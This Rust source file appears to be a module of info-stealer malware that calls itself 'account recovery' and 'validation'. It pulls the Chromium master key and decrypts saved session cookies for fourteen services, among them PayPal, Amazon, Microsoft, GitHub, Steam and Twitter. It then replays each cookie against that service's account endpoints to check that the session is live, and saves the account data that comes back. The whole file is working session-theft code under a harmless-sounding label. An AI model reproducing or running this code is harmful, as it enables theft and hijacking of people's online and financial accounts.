use crate::recovery::{
    browsers::{BrowserName, BrowserProfile, browser_data_roots},
    chromium,
    context::RecoveryContext,
    fs::sanitize_label,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use reqwest::Client;
use rusqlite::{Connection, params};
use serde_json::{Value, json};
use std::collections::HashSet;
use std::env;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::{fs, task};
use tracing::{debug, warn};

const TWITTER_BEARER_TOKEN: &str = "AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA";
const TWITCH_GRAPHQL: &str = r#"{"query":"query { user { id login displayName email hasPrime isPartner followers { totalCount } } }"}"#;

struct PlatformConfig {
    id: &'static str,
    domain: &'static str,
    cookie_name: &'static str,
}

const PLATFORM_CONFIGS: &[PlatformConfig] = &[
    PlatformConfig {
        id: "twitter",
        domain: "twitter.com",
        cookie_name: "auth_token",
    },
    PlatformConfig {
        id: "tiktok",
        domain: "tiktok.com",
        cookie_name: "sessionid",
    },
    PlatformConfig {
        id: "twitch",
        domain: "twitch.tv",
        cookie_name: "auth-token",
    },
    PlatformConfig {
        id: "instagram",
        domain: "instagram.com",
        cookie_name: "sessionid",
    },
    PlatformConfig {
        id: "reddit",
        domain: "reddit.com",
        cookie_name: "reddit_session",
    },
    PlatformConfig {
        id: "spotify",
        domain: "spotify.com",
        cookie_name: "sp_dc",
    },
    PlatformConfig {
        id: "github",
        domain: "github.com",
        cookie_name: "user_session",
    },
    PlatformConfig {
        id: "notion",
        domain: "notion.so",
        cookie_name: "token_v2",
    },
    PlatformConfig {
        id: "steam",
        domain: "steamcommunity.com",
        cookie_name: "steamLoginSecure",
    },
    PlatformConfig {
        id: "dropbox",
        domain: "dropbox.com",
        cookie_name: "t",
    },
    PlatformConfig {
        id: "linkedin",
        domain: "linkedin.com",
        cookie_name: "li_at",
    },
    PlatformConfig {
        id: "paypal",
        domain: "paypal.com",
        cookie_name: "PYPSESSION",
    },
    PlatformConfig {
        id: "amazon",
        domain: "amazon.com",
        cookie_name: "session-id",
    },
    PlatformConfig {
        id: "microsoft",
        domain: "account.microsoft.com",
        cookie_name: "MSPRequ",
    },
];

pub struct AccountValidationTask {
    specs: Vec<(BrowserName, PathBuf)>,
}

impl AccountValidationTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        Self {
            specs: browser_data_roots(ctx),
        }
    }

    async fn collect_tokens(&self) -> Result<Vec<TokenCandidate>, RecoveryError> {
        let mut tokens = Vec::new();

        for (browser, root) in &self.specs {
            let local_state = root.join("Local State");
            if !local_state.exists() {
                debug!(browser=?browser, path=?root, "local state missing for account validation");
                continue;
            }

            let master_key = match chromium::extract_master_key(&local_state)? {
                Some(key) => key,
                None => {
                    debug!(browser=?browser, "master key missing in local state");
                    continue;
                }
            };

            let profiles = BrowserProfile::discover_for_root(*browser, root).await;
            for profile in profiles {
                let cookies_path = profile.path.join("Cookies");
                if !cookies_path.exists() {
                    continue;
                }

                let temp_db = copy_to_temp(&cookies_path, *browser, &profile.profile_name).await?;
                let found = read_tokens_from_db(temp_db.clone(), master_key.clone()).await;
                let _ = fs::remove_file(&temp_db).await;
                let found = found?;
                tokens.extend(found);
            }
        }

        Ok(tokens)
    }
}

#[async_trait]
impl RecoveryTask for AccountValidationTask {
    fn label(&self) -> String {
        "Account Validation".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Browsers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let tokens = self.collect_tokens().await?;
        if tokens.is_empty() {
            return Ok(artifacts);
        }

        let client = build_client()?;
        let mut seen_platforms = HashSet::new();

        for candidate in tokens.into_iter() {
            if !seen_platforms.insert(candidate.platform) {
                continue;
            }

            match validate_token(&client, candidate.platform, &candidate.token).await {
                Ok(Some(response)) => {
                    let artifact =
                        write_validation_artifact(ctx, candidate.platform, response).await?;
                    artifacts.push(artifact);
                }
                Ok(None) => {
                    debug!(platform=?candidate.platform, "platform validation yielded non-success status");
                }
                Err(err) => {
                    warn!(platform=?candidate.platform, error=?err, "validation request failed");
                }
            }

            if seen_platforms.len() == PLATFORM_CONFIGS.len() {
                break;
            }
        }

        Ok(artifacts)
    }
}

pub fn account_validation_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(AccountValidationTask::new(ctx))
}

struct TokenCandidate {
    platform: &'static str,
    token: String,
}

struct ValidationResponse {
    status: u16,
    body: Value,
}

fn build_client() -> Result<Client, RecoveryError> {
    Client::builder()
        .timeout(Duration::from_secs(8))
        .build()
        .map_err(|err| RecoveryError::Custom(format!("failed to build HTTP client: {err}")))
}

async fn validate_token(
    client: &Client,
    platform: &str,
    token: &str,
) -> Result<Option<ValidationResponse>, reqwest::Error> {
    match platform {
        "twitter" => {
            let response = client
                .post("https://twitter.com/i/api/1.1/account/update_profile.json")
                .header("Authorization", format!("Bearer {TWITTER_BEARER_TOKEN}"))
                .header("Cookie", format!("auth_token={token}"))
                .send()
                .await?;
            parse_validation_response("twitter", response).await
        }
        "tiktok" => {
            let response = client
                .get("https://www.tiktok.com/passport/web/account/info/")
                .header("Cookie", format!("sessionid={token}"))
                .send()
                .await?;
            parse_validation_response("tiktok", response).await
        }
        "twitch" => {
            let response = client
                .post("https://gql.twitch.tv/gql")
                .header("Authorization", format!("OAuth {token}"))
                .header("Content-Type", "application/json")
                .body(TWITCH_GRAPHQL.to_string())
                .send()
                .await?;
            parse_validation_response("twitch", response).await
        }
        "instagram" => {
            let response = client
                .get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true")
                .header("Cookie", format!("sessionid={token}"))
                .send()
                .await?;
            parse_validation_response("instagram", response).await
        }
        "reddit" => {
            let response = client
                .get("https://oauth.reddit.com/api/v1/me")
                .header("Authorization", format!("Bearer {token}"))
                .send()
                .await?;
            parse_validation_response("reddit", response).await
        }
        "spotify" => {
            let response = client
                .get("https://www.spotify.com/api/account-settings/v1/profile")
                .header("Cookie", format!("sp_dc={token}"))
                .send()
                .await?;
            parse_validation_response("spotify", response).await
        }
        "github" => {
            let response = client
                .get("https://github.com/settings/profile")
                .header("Accept", "text/html,application/xhtml+xml")
                .header("Cookie", format!("logged_in=yes; user_session={token}"))
                .send()
                .await?;
            parse_validation_response("github", response).await
        }
        "notion" => {
            let response = client
                .post("https://www.notion.so/api/v3/getSpaces")
                .header("Content-Type", "application/json")
                .header("Cookie", format!("token_v2={token}"))
                .body(r#"{"limit":1}"#)
                .send()
                .await?;
            parse_validation_response("notion", response).await
        }
        "steam" => {
            let response = client
                .get("https://steamcommunity.com/my/profile")
                .header("Cookie", format!("steamLoginSecure={token}"))
                .send()
                .await?;
            parse_validation_response("steam", response).await
        }
        "dropbox" => {
            let response = client
                .get("https://www.dropbox.com/account")
                .header("Cookie", format!("t={token}"))
                .header("Accept", "text/html,application/xhtml+xml")
                .send()
                .await?;
            parse_validation_response("dropbox", response).await
        }
        "linkedin" => {
            let response = client
                .get("https://www.linkedin.com/voyager/api/me")
                .header("Accept", "application/json")
                .header("Cookie", format!("li_at={token}"))
                .send()
                .await?;
            parse_validation_response("linkedin", response).await
        }
        "paypal" => {
            let response = client
                .get("https://www.paypal.com/myaccount/summary")
                .header("Cookie", format!("PYPSESSION={token}"))
                .header("Accept", "text/html,application/xhtml+xml")
                .send()
                .await?;
            parse_validation_response("paypal", response).await
        }
        "amazon" => {
            let response = client
                .get("https://www.amazon.com/gp/your-account")
                .header("Cookie", format!("session-id={token}"))
                .header("Accept", "text/html,application/xhtml+xml")
                .send()
                .await?;
            parse_validation_response("amazon", response).await
        }
        "microsoft" => {
            let response = client
                .get("https://account.microsoft.com/profile")
                .header("Cookie", format!("MSPRequ={token}"))
                .header("Accept", "text/html,application/xhtml+xml")
                .send()
                .await?;
            parse_validation_response("microsoft", response).await
        }
        _ => Ok(None),
    }
}

async fn parse_response(response: reqwest::Response) -> Result<ValidationResponse, reqwest::Error> {
    let status = response.status();
    let text = response.text().await?;
    let body = serde_json::from_str(&text).unwrap_or_else(|_| Value::String(text));
    Ok(ValidationResponse {
        status: status.as_u16(),
        body,
    })
}

async fn parse_validation_response(
    platform: &str,
    response: reqwest::Response,
) -> Result<Option<ValidationResponse>, reqwest::Error> {
    if response.status().is_success() {
        let parsed = parse_response(response).await?;
        if !is_validation_body_valid(platform, &parsed.body) {
            debug!(
                platform = ?platform,
                status = ?parsed.status,
                "validation response missing expected fields"
            );
            return Ok(None);
        }
        Ok(Some(parsed))
    } else {
        Ok(None)
    }
}

fn is_validation_body_valid(platform: &str, body: &Value) -> bool {
    match platform {
        "twitter" => has_json_path(body, &["id"]) || has_json_path(body, &["id_str"]),
        "tiktok" => {
            has_json_path(body, &["data", "user_id"])
                || has_json_path(body, &["data", "user_id_str"])
        }
        "twitch" => has_json_path(body, &["data", "user", "id"]),
        "instagram" => {
            has_json_path(body, &["user", "pk"]) || has_json_path(body, &["user", "username"])
        }
        "reddit" => has_json_path(body, &["id"]) || has_json_path(body, &["name"]),
        "spotify" => has_json_path(body, &["product"]) || has_json_path(body, &["display_name"]),
        "github" => html_contains(body, "name=\"user_profile[name]\""),
        "notion" => has_json_path(body, &["recordMap"]),
        "steam" => html_contains(body, "class=\"profile_header_top\""),
        "dropbox" => html_contains(body, "<title>Account | Dropbox</title>"),
        "linkedin" => has_json_path(body, &["data"]),
        "paypal" => html_contains(body, "Account Overview | PayPal"),
        "amazon" => html_contains(body, "Your Account"),
        "microsoft" => html_contains(body, "My Microsoft account"),
        _ => true,
    }
}

fn has_json_path(mut value: &Value, path: &[&str]) -> bool {
    for key in path {
        match value.get(*key) {
            Some(nested) => value = nested,
            None => return false,
        }
    }
    !value.is_null()
}

fn html_contains(body: &Value, substring: &str) -> bool {
    body.as_str()
        .map(|text| text.contains(substring))
        .unwrap_or(false)
}

async fn write_validation_artifact(
    ctx: &RecoveryContext,
    platform: &str,
    response: ValidationResponse,
) -> Result<RecoveryArtifact, RecoveryError> {
    let folder = account_validation_dir(ctx).await?;
    let file_name = format!("{platform}.json");
    let target = folder.join(file_name);
    let payload = json!({
        "platform": platform,
        "status": response.status,
        "body": response.body,
    });

    let contents = serde_json::to_string_pretty(&payload)
        .map_err(|err| RecoveryError::Custom(format!("serialization failed: {err}")))?;
    fs::write(&target, contents).await?;
    let meta = fs::metadata(&target).await?;
    Ok(RecoveryArtifact {
        label: platform.to_string(),
        path: target,
        size_bytes: meta.len(),
        modified: meta.modified().ok(),
    })
}

async fn account_validation_dir(ctx: &RecoveryContext) -> Result<PathBuf, RecoveryError> {
    let base = ctx
        .output_dir
        .join("services")
        .join("Browsers")
        .join(sanitize_label("Account Validation"));
    fs::create_dir_all(&base).await?;
    Ok(base)
}

async fn read_tokens_from_db(
    temp_db: PathBuf,
    master_key: Vec<u8>,
) -> Result<Vec<TokenCandidate>, RecoveryError> {
    let db_path = temp_db.clone();
    let key = master_key;
    task::spawn_blocking(move || collect_tokens_from_db_sync(&db_path, &key)).await?
}

fn collect_tokens_from_db_sync(
    db_path: &Path,
    master_key: &[u8],
) -> Result<Vec<TokenCandidate>, RecoveryError> {
    let connection = Connection::open(db_path).map_err(|err| sqlite_error("open", err))?;

    let mut tokens = Vec::new();

    for config in PLATFORM_CONFIGS {
        let mut statement = connection
            .prepare("SELECT encrypted_value FROM cookies WHERE host_key LIKE ?1 AND name = ?2")
            .map_err(|err| sqlite_error("prepare", err))?;

        let pattern = format!("%{}%", config.domain);
        let rows = statement
            .query_map(params![pattern, config.cookie_name], |row| {
                row.get::<_, Vec<u8>>(0)
            })
            .map_err(|err| sqlite_error("query", err))?;

        for row in rows {
            match row.map_err(|err| sqlite_error("row", err)) {
                Ok(encrypted) => match chromium::decrypt_chromium_value(&encrypted, master_key) {
                    Ok(value) if !value.is_empty() => {
                        tokens.push(TokenCandidate {
                            platform: config.id,
                            token: value,
                        });
                    }
                    Ok(_) => {}
                    Err(err) => {
                        warn!(platform=?config.id, "cookie decryption failed: {err}");
                    }
                },
                Err(err) => {
                    warn!(platform=?config.id, error=?err, "failed to read cookie row");
                }
            }
        }
    }

    Ok(tokens)
}

fn sqlite_error(stage: &str, err: rusqlite::Error) -> RecoveryError {
    RecoveryError::Custom(format!("sqlite {stage} error: {err}"))
}

fn sanitize_profile_name(name: &str) -> String {
    let filtered: String = name
        .chars()
        .map(|ch| if ch.is_ascii_alphanumeric() { ch } else { '_' })
        .collect();
    if filtered.is_empty() {
        "profile".into()
    } else {
        filtered
    }
}

async fn copy_to_temp(
    source: &Path,
    browser: BrowserName,
    profile: &str,
) -> Result<PathBuf, RecoveryError> {
    let sanitized_profile = sanitize_profile_name(profile);
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|value| value.as_nanos())
        .unwrap_or_default();
    let browser_label = browser.label().replace(' ', "_");
    let file_name = format!(
        "ixodes-cookies-{}-{}-{}.db",
        browser_label, sanitized_profile, timestamp
    );

    let destination = env::temp_dir().join(file_name);
    if destination.exists() {
        let _ = fs::remove_file(&destination).await;
    }

    fs::copy(source, &destination).await?;
    Ok(destination)
}
